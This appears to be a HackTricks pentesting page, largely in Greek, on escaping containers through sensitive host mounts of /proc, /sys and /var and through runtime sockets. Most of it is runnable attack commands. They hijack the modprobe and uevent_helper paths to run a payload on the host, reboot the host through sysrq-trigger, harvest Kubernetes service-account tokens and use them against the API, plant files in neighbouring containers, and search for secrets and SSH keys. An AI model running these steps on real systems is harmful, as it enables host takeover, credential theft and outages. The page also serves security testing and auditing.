# Ευαίσθητες Host Mounts

{{#include ../../../banners/hacktricks-training.md}}

## Επισκόπηση

Host mounts είναι μία από τις πιο σημαντικές πρακτικές επιφάνειες container-escape, επειδή συχνά καταρρίπτουν μια προσεκτικά απομονωμένη προβολή διεργασίας επιστρέφοντας σε άμεση ορατότητα πόρων του host. Οι επικίνδυνες περιπτώσεις δεν περιορίζονται στο `/`. Bind mounts του `/proc`, `/sys`, `/var`, runtime sockets, kubelet-managed state ή διαδρομές σχετικές με συσκευές μπορούν να εκθέσουν ελέγχους kernel, credentials, filesystems γειτονικών containers και interfaces διαχείρισης runtime.

Αυτή η σελίδα υπάρχει ξεχωριστά από τις επιμέρους σελίδες προστασίας επειδή το μοντέλο κατάχρησης είναι διατομεακό. Ένα writable host mount είναι επικίνδυνο εν μέρει λόγω mount namespaces, εν μέρει λόγω user namespaces, εν μέρει λόγω AppArmor ή SELinux κάλυψης, και εν μέρει λόγω του ποιο ακριβώς host path εκτέθηκε. Η αντιμετώπιση του ως ξεχωριστό θέμα κάνει την επιφάνεια επίθεσης πολύ πιο εύκολη στην ανάλυση.

## `/proc` Έκθεση

procfs περιέχει τόσο κοινές πληροφορίες διεργασιών όσο και διεπαφές ελέγχου kernel με υψηλό αντίκτυπο. Ένα bind mount όπως `-v /proc:/host/proc` ή μια προβολή container που εκθέτει απροσδόκητες εγγράψιμες εγγραφές proc μπορεί συνεπώς να οδηγήσει σε αποκάλυψη πληροφοριών, denial of service, ή άμεση εκτέλεση κώδικα στο host.

Διαδρομές procfs υψηλής αξίας περιλαμβάνουν:

- `/proc/sys/kernel/core_pattern`
- `/proc/sys/kernel/modprobe`
- `/proc/sys/vm/panic_on_oom`
- `/proc/sys/fs/binfmt_misc`
- `/proc/config.gz`
- `/proc/sysrq-trigger`
- `/proc/kmsg`
- `/proc/kallsyms`
- `/proc/[pid]/mem`
- `/proc/kcore`
- `/proc/kmem`
- `/proc/mem`
- `/proc/sched_debug`
- `/proc/[pid]/mountinfo`

### Κατάχρηση

Ξεκινήστε ελέγχοντας ποιες σημαντικές εγγραφές του procfs είναι ορατές ή εγγράψιμες:
```bash
for p in \
/proc/sys/kernel/core_pattern \
/proc/sys/kernel/modprobe \
/proc/sysrq-trigger \
/proc/kmsg \
/proc/kallsyms \
/proc/kcore \
/proc/sched_debug \
/proc/1/mountinfo \
/proc/config.gz; do
[ -e "$p" ] && ls -l "$p"
done
```
These paths are interesting for different reasons. `core_pattern`, `modprobe`, and `binfmt_misc` can become host code-execution paths when writable. `kallsyms`, `kmsg`, `kcore`, and `config.gz` are powerful reconnaissance sources for kernel exploitation. `sched_debug` and `mountinfo` reveal process, cgroup, and filesystem context that can help reconstruct the host layout from inside the container.

Η πρακτική αξία κάθε διαδρομής διαφέρει, και η αντιμετώπισή τους σαν να έχουν τον ίδιο αντίκτυπο δυσκολεύει την εκτίμηση και προτεραιοποίηση:

- `/proc/sys/kernel/core_pattern`
Αν είναι εγγράψιμο, αυτή είναι μία από τις διαδρομές procfs με τον υψηλότερο αντίκτυπο επειδή ο kernel θα εκτελέσει έναν pipe handler μετά από crash. Ένα container που μπορεί να δείξει το `core_pattern` σε ένα payload αποθηκευμένο στο overlay του ή σε ένα mounted host path συχνά μπορεί να αποκτήσει host code execution. See also [read-only-paths.md](protections/read-only-paths.md) for a dedicated example.
- `/proc/sys/kernel/modprobe`
Αυτή η διαδρομή ελέγχει το userspace helper που χρησιμοποιεί ο kernel όταν χρειάζεται να καλέσει τη λογική φόρτωσης module. Αν είναι εγγράψιμη από το container και ερμηνεύεται στο host context, μπορεί να γίνει άλλο host code-execution primitive. Είναι ιδιαίτερα ενδιαφέρουσα όταν συνδυάζεται με τρόπο να ενεργοποιηθεί το helper path.
- `/proc/sys/vm/panic_on_oom`
Συνήθως δεν είναι ένα καθαρό escape primitive, αλλά μπορεί να μετατρέψει την πίεση μνήμης σε host-wide denial of service μετατρέποντας OOM συνθήκες σε kernel panic συμπεριφορά.
- `/proc/sys/fs/binfmt_misc`
Εάν το registration interface είναι εγγράψιμο, ο attacker μπορεί να καταχωρήσει έναν handler για μια επιλεγμένη magic value και να αποκτήσει host-context execution όταν εκτελεστεί ένα ταιριαστό αρχείο.
- `/proc/config.gz`
Χρήσιμο για kernel exploit triage. Βοηθά να καθοριστεί ποια υποσυστήματα, mitigations και προαιρετικά χαρακτηριστικά του kernel είναι ενεργοποιημένα χωρίς να χρειάζεται host package metadata.
- `/proc/sysrq-trigger`
Κυρίως ένα denial-of-service μονοπάτι, αλλά πολύ σοβαρό. Μπορεί να κάνει reboot, panic, ή με άλλο τρόπο να διαταράξει άμεσα το host.
- `/proc/kmsg`
Αποκαλύπτει μηνύματα του kernel ring buffer. Χρήσιμο για host fingerprinting, crash analysis, και σε ορισμένα περιβάλλοντα για leaking πληροφοριών χρήσιμων για kernel exploitation.
- `/proc/kallsyms`
Πολύτιμο όταν είναι αναγνώσιμο επειδή εκθέτει exported kernel symbol πληροφορίες και μπορεί να βοηθήσει στην υπέρβαση των υποθέσεων address randomization κατά την ανάπτυξη kernel exploits.
- `/proc/[pid]/mem`
Πρόκειται για άμεσο interface στη μνήμη μιας διεργασίας. Εάν η στοχευόμενη διεργασία είναι προσιτή με τις απαραίτητες ptrace-style συνθήκες, μπορεί να επιτρέψει την ανάγνωση ή τροποποίηση της μνήμης άλλης διεργασίας. Ο ρεαλιστικός αντίκτυπος εξαρτάται σε μεγάλο βαθμό από credentials, `hidepid`, Yama και περιορισμούς ptrace, οπότε είναι ένα ισχυρό αλλά εξαρτώμενο μονοπάτι.
- `/proc/kcore`
Εκθέτει μια προβολή τύπου core-image της μνήμης του συστήματος. Το αρχείο είναι τεράστιο και δύσχρηστο, αλλά αν είναι ουσιαστικά αναγνώσιμο υποδεικνύει μια κακώς εκτεθειμένη επιφάνεια μνήμης του host.
- `/proc/kmem` and `/proc/mem`
Ιστορικά υψηλού αντίκτυπου raw memory interfaces. Σε πολλά σύγχρονα συστήματα είναι απενεργοποιημένα ή έντονα περιορισμένα, αλλά εάν υπάρχουν και είναι χρησιμοποιήσιμα πρέπει να θεωρούνται κρίσιμα ευρήματα.
- `/proc/sched_debug`
Leaks πληροφορίες για scheduling και task που μπορεί να αποκαλύψουν τις ταυτότητες διεργασιών του host ακόμα και όταν άλλες προβολές διεργασιών φαίνονται καθαρότερες από το αναμενόμενο.
- `/proc/[pid]/mountinfo`
Εξαιρετικά χρήσιμο για την ανακατασκευή του πού πραγματικά "ζει" το container στο host, ποιες διαδρομές είναι overlay-backed, και αν ένα εγγράψιμο mount αντιστοιχεί σε περιεχόμενο του host ή μόνο στο container layer.

If `/proc/[pid]/mountinfo` or overlay details are readable, use them to recover the host path of the container filesystem:
```bash
cat /proc/self/mountinfo | head -n 50
mount | grep overlay
```
Αυτές οι εντολές είναι χρήσιμες επειδή αρκετές τεχνικές host-execution απαιτούν να μετατρέψετε ένα path μέσα στο container στο αντίστοιχο path από την οπτική του host.

### Πλήρες Παράδειγμα: `modprobe` Helper Path Abuse

Εάν το `/proc/sys/kernel/modprobe` είναι εγγράψιμο από το container και το helper path ερμηνεύεται στο context του host, μπορεί να ανακατευθυνθεί σε payload που ελέγχεται από τον attacker:
```bash
[ -w /proc/sys/kernel/modprobe ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /tmp/modprobe-payload
#!/bin/sh
id > /tmp/modprobe.out
EOF
chmod +x /tmp/modprobe-payload
echo "$host_path/tmp/modprobe-payload" > /proc/sys/kernel/modprobe
cat /proc/sys/kernel/modprobe
```
Ο ακριβής μηχανισμός ενεργοποίησης εξαρτάται από τον στόχο και τη συμπεριφορά του kernel, αλλά το σημαντικό σημείο είναι ότι μια εγγράψιμη helper path μπορεί να ανακατευθύνει μια μελλοντική kernel helper κλήση σε περιεχόμενο host-path που ελέγχεται από τον εισβολέα.

### Πλήρες Παράδειγμα: Kernel Recon με `kallsyms`, `kmsg` και `config.gz`

Εάν ο στόχος είναι αξιολόγηση της exploitability και όχι άμεση διαφυγή:
```bash
head -n 20 /proc/kallsyms 2>/dev/null
dmesg 2>/dev/null | head -n 50
zcat /proc/config.gz 2>/dev/null | egrep 'IKCONFIG|BPF|USER_NS|SECCOMP|KPROBES' | head -n 50
```
Αυτές οι εντολές βοηθούν να απαντηθεί αν χρήσιμες πληροφορίες συμβόλων είναι ορατές, αν πρόσφατα kernel messages αποκαλύπτουν ενδιαφέροντα στοιχεία, και ποιες kernel features ή mitigations είναι compiled in. Ο αντίκτυπος συνήθως δεν οδηγεί σε άμεση escape, αλλά μπορεί να μειώσει δραστικά τον χρόνο του kernel-vulnerability triage.

### Πλήρες Παράδειγμα: SysRq Host Reboot

Εάν το `/proc/sysrq-trigger` είναι εγγράψιμο και είναι ορατό από το host:
```bash
echo b > /proc/sysrq-trigger
```
Το αποτέλεσμα είναι άμεση επανεκκίνηση του host. Δεν είναι ένα λεπτό παράδειγμα, αλλά δείχνει σαφώς ότι η έκθεση του procfs μπορεί να είναι πολύ πιο σοβαρή από την αποκάλυψη πληροφοριών.

## `/sys` Έκθεση

Το sysfs εκθέτει μεγάλα ποσά κατάστασης του kernel και των συσκευών. Ορισμένα sysfs paths είναι κυρίως χρήσιμα για fingerprinting, ενώ άλλα μπορούν να επηρεάσουν την εκτέλεση βοηθητικών προγραμμάτων (helper), τη συμπεριφορά της συσκευής, τη διαμόρφωση security-module ή την κατάσταση του firmware.

High-value sysfs paths include:

- `/sys/kernel/uevent_helper`
- `/sys/class/thermal`
- `/sys/kernel/vmcoreinfo`
- `/sys/kernel/security`
- `/sys/firmware/efi/vars`
- `/sys/firmware/efi/efivars`
- `/sys/kernel/debug`

Αυτές οι διαδρομές έχουν σημασία για διαφορετικούς λόγους. Το `/sys/class/thermal` μπορεί να επηρεάσει τη συμπεριφορά της διαχείρισης θερμοκρασίας και συνεπώς τη σταθερότητα του host σε περιβάλλοντα με κακή έκθεση. Το `/sys/kernel/vmcoreinfo` μπορεί να leak πληροφορίες crash-dump και kernel-layout που βοηθούν στο low-level host fingerprinting. Το `/sys/kernel/security` είναι η διεπαφή `securityfs` που χρησιμοποιείται από Linux Security Modules, οπότε η απρόσμενη πρόσβαση εκεί μπορεί να εκθέσει ή να αλλάξει κατάσταση σχετική με MAC. Οι διαδρομές μεταβλητών EFI μπορούν να επηρεάσουν ρυθμίσεις εκκίνησης που υποστηρίζονται από firmware, κάνοντάς τες πολύ πιο σοβαρές από τα συνηθισμένα αρχεία ρυθμίσεων. Το `debugfs` κάτω από το `/sys/kernel/debug` είναι ιδιαίτερα επικίνδυνο επειδή είναι ηθελημένα μια διεπαφή προσανατολισμένη σε developers με πολύ λιγότερες προσδοκίες ασφάλειας σε σχέση με τα hardened production-facing kernel APIs.

Χρήσιμες εντολές ανασκόπησης για αυτές τις διαδρομές είναι:
```bash
find /sys/kernel/security -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/kernel/debug -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/firmware/efi -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/class/thermal -maxdepth 3 -type f 2>/dev/null | head -n 50
cat /sys/kernel/vmcoreinfo 2>/dev/null | head -n 20
```
Τι τα κάνει ενδιαφέροντα αυτά τα commands:

- `/sys/kernel/security` μπορεί να αποκαλύψει αν το AppArmor, το SELinux ή κάποια άλλη LSM surface είναι ορατή με τρόπο που θα έπρεπε να είχε παραμείνει host-only.
- `/sys/kernel/debug` είναι συχνά το πιο ανησυχητικό εύρημα σε αυτή την ομάδα. Αν το `debugfs` είναι mounted και readable ή writable, αναμένετε μια μεγάλη kernel-facing surface της οποίας ο ακριβής κίνδυνος εξαρτάται από τους ενεργοποιημένους debug nodes.
- Η έκθεση μεταβλητών EFI είναι λιγότερο συχνή, αλλά αν υπάρχει έχει υψηλό αντίκτυπο επειδή αγγίζει firmware-backed settings αντί για ordinary runtime files.
- `/sys/class/thermal` σχετίζεται κυρίως με host stability και hardware interaction, όχι με neat shell-style escape.
- `/sys/kernel/vmcoreinfo` είναι κυρίως μια host-fingerprinting και crash-analysis πηγή, χρήσιμη για την κατανόηση του low-level kernel state.

### Πλήρες Παράδειγμα: `uevent_helper`

Αν το `/sys/kernel/uevent_helper` είναι writable, ο kernel μπορεί να εκτελέσει έναν attacker-controlled helper όταν ενεργοποιείται ένα `uevent`:
```bash
cat <<'EOF' > /evil-helper
#!/bin/sh
id > /output
EOF
chmod +x /evil-helper
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /output
```
Ο λόγος που αυτό λειτουργεί είναι ότι το helper path ερμηνεύεται από την οπτική του host. Μόλις ενεργοποιηθεί, ο helper εκτελείται στο host context αντί μέσα στο τρέχον container.

## `/var` Έκθεση

Το mount του host `/var` μέσα σε ένα container συχνά υποεκτιμάται επειδή δεν φαίνεται τόσο δραματικό όσο το mount του `/`. Στην πράξη μπορεί να είναι αρκετό για να αποκτήσει κανείς πρόσβαση σε runtime sockets, container snapshot directories, kubelet-managed pod volumes, projected service-account tokens, και στα γειτονικά application filesystems. Σε σύγχρονα nodes, το `/var` συχνά είναι όπου ζει το πιο λειτουργικά ενδιαφέρον container state.

### Kubernetes Example

Ένα pod με `hostPath: /var` μπορεί συχνά να διαβάσει τα projected tokens άλλων pods και το overlay snapshot περιεχόμενο:
```bash
find /host-var/ -type f -iname '*.env*' 2>/dev/null
find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null
```
Αυτές οι εντολές είναι χρήσιμες επειδή απαντούν αν το mount αποκαλύπτει μόνο ασήμαντα δεδομένα εφαρμογής ή διαπιστευτήρια cluster υψηλού αντίκτυπου. Ένα αναγνώσιμο service-account token μπορεί αμέσως να μετατρέψει το local code execution σε πρόσβαση στο Kubernetes API.

Αν το token υπάρχει, επαλήθευσε τι μπορεί να προσπελάσει αντί να σταματήσεις στην ανακάλυψη του token:
```bash
TOKEN=$(cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api
```
Ο αντίκτυπος εδώ μπορεί να είναι πολύ μεγαλύτερος από την πρόσβαση στον τοπικό node. Ένα token με ευρεία RBAC μπορεί να μετατρέψει ένα προσαρτημένο `/var` σε παραβίαση που εκτείνεται σε όλο το cluster.

### Docker και containerd — Παράδειγμα

Σε Docker hosts τα σχετικά δεδομένα συχνά βρίσκονται κάτω από `/var/lib/docker`, ενώ σε Kubernetes nodes με containerd μπορεί να βρίσκονται κάτω από `/var/lib/containerd` ή σε διαδρομές ειδικές για snapshotter:
```bash
docker info 2>/dev/null | grep -i 'docker root\\|storage driver'
find /host-var/lib -maxdepth 5 -type f -iname '*.env*' 2>/dev/null | head -n 50
find /host-var/lib -maxdepth 8 -type f -iname 'index.html' 2>/dev/null | head -n 50
```
Εάν το προσαρτημένο `/var` αποκαλύπτει εγγράψιμο περιεχόμενο στιγμιότυπου (snapshot) ενός άλλου φόρτου εργασίας, ο επιτιθέμενος μπορεί να τροποποιήσει αρχεία εφαρμογής, να φυτέψει περιεχόμενο ιστού ή να αλλάξει scripts εκκίνησης χωρίς να αγγίξει την τρέχουσα διαμόρφωση του container.

Συγκεκριμένες ιδέες κατάχρησης όταν βρεθεί εγγράψιμο περιεχόμενο στιγμιότυπου:
```bash
echo '<html><body>pwned</body></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/<id>/fs/usr/share/nginx/html/index2.html 2>/dev/null
grep -Rni 'JWT_SECRET\\|TOKEN\\|PASSWORD' /host-var/lib 2>/dev/null | head -n 50
find /host-var/lib -type f -path '*/.ssh/*' -o -path '*/authorized_keys' 2>/dev/null | head -n 20
```
Οι εντολές αυτές είναι χρήσιμες επειδή δείχνουν τις τρεις κύριες οικογένειες επιπτώσεων του mounted `/var`: application tampering, secret recovery, and lateral movement into neighboring workloads.

## Runtime Sockets

Τα Sensitive host mounts συχνά περιλαμβάνουν runtime sockets αντί για πλήρεις καταλόγους. Είναι τόσο σημαντικά που αξίζουν ρητή επανάληψη εδώ:
```text
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/run/buildkit/buildkitd.sock
/var/run/kubelet.sock
/run/firecracker-containerd.sock
```
Δείτε [runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md) για πλήρεις ροές εκμετάλλευσης μόλις ένας από αυτούς τους sockets προσαρτηθεί.

Ως γρήγορο πρώτο πρότυπο αλληλεπίδρασης:
```bash
docker -H unix:///host/run/docker.sock version 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///host/var/run/crio/crio.sock ps 2>/dev/null
```
Αν κάποιο από αυτά πετύχει, η διαδρομή από "mounted socket" προς "start a more privileged sibling container" είναι συνήθως πολύ πιο σύντομη από οποιαδήποτε διαδρομή για kernel breakout.

## CVE σχετικά με mounts

Τα host mounts επίσης επικαλύπτονται με ευπάθειες του runtime. Σημαντικά πρόσφατα παραδείγματα περιλαμβάνουν:

- `CVE-2024-21626` στο `runc`, όπου ένας leaked directory file descriptor θα μπορούσε να θέσει τον τρέχοντα κατάλογο εργασίας στο host filesystem.
- `CVE-2024-23651` και `CVE-2024-23653` στο BuildKit, όπου οι copy-up races του OverlayFS θα μπορούσαν να παράγουν εγγραφές σε host-path κατά τη διάρκεια των builds.
- `CVE-2024-1753` σε Buildah και τις ροές build του Podman, όπου καλοσχεδιασμένα bind mounts κατά το build θα μπορούσαν να εκθέσουν `/` ως read-write.
- `CVE-2024-40635` στο containerd, όπου μια μεγάλη τιμή `User` θα μπορούσε να υπερχειλίσει σε συμπεριφορά UID 0.

Αυτές οι CVE έχουν σημασία εδώ γιατί δείχνουν ότι ο χειρισμός των mounts δεν αφορά μόνο τη ρύθμιση από τον operator. Το runtime μπορεί επίσης να εισαγάγει συνθήκες διαφυγής που οφείλονται σε mounts.

## Έλεγχοι

Χρησιμοποιήστε αυτές τις εντολές για να εντοπίσετε γρήγορα τις πιο κρίσιμες εκθέσεις mount:
```bash
mount
find / -maxdepth 3 \( -path '/host*' -o -path '/mnt*' -o -path '/rootfs*' \) -type d 2>/dev/null | head -n 100
find / -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
- Το root του host, `/proc`, `/sys`, `/var`, και τα runtime sockets είναι όλα ευρήματα υψηλής προτεραιότητας.
- Οι εγγράψιμες εγγραφές σε proc/sys συχνά σημαίνουν ότι το mount εκθέτει παγκόσμιους ελέγχους του kernel του host αντί για μια ασφαλή προβολή του container.
- Οι mounted `/var` διαδρομές αξίζουν έλεγχο διαπιστευτηρίων και των γειτονικών workloads, όχι μόνο έλεγχο του filesystem.
{{#include ../../../banners/hacktricks-training.md}}
